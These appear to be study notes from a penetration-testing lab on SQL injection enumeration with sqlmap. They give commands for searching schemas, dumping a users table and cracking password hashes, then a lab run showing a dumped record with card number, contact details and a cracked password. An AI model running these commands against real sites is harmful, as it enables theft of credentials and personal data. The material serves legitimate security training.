# Advanced Database Enumeration

DB Schema Enumeration
sqlmap -u "http://www.example.com/?id=1" --schema

Searching for Data
sqlmap -u "http://www.example.com/?id=1" --search -T user

-> Search tables LIKE user

sqlmap -u "http://www.example.com/?id=1" --search -C pass

-> Search columns LIKE pass (password)

Password Enumeration and Cracking
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

-> SQLMap has automatic password hashes cracking capabilities

DB Users Password Enumeration and Cracking
sqlmap -u "http://www.example.com/?id=1" --passwords --batch

## LAB

94.237.62.195:57826
sqlmap -u 'http://94.237.62.195:57826/case1.php?id=1' --search -C style

Database: information_schema
Table: ROUTINES
[1 column]
+-----------------+------------+
| Column          | Type       |
+-----------------+------------+
| PARAMETER_STYLE | varchar(8) |
+-----------------+------------+

sqlmap -u 'http://94.237.62.195:57826/case1.php?id=1' --search -T Kimberly

sqlmap -u 'http://94.237.62.195:57826/case1.php?id=1' --search -T user

Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

sqlmap -u 'http://94.237.62.195:57826/case1.php?id=1' --search -C pass

Database: testdb
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

sqlmap -u 'http://94.237.62.195:57826/case1.php?id=1' --dump -D testdb -T users

| 6  | 5143241665092174 | Kimberly Wright   | KimberlyMWright@gmail.com   | 440-232-3739 | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist     

[12:08:58] [INFO] cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
